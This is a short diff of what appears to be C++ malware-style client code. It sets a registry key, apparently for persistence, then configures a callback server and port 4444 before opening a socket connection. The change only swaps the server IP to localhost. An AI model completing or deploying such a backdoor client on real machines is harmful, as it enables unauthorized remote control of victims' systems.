@@ -136,7 +136,7 @@ int main() {
     SetRegistryKey();
 
     // Define server IP and port
-    const std::string serverIP = "192.168.1.16"; // Replace with your server's IP
+    const std::string serverIP = "127.0.0.1"; // Replace with your server's IP
     const int serverPort = 4444;                // Replace with your server's port
 
     // Initialize the socket and connect to the server
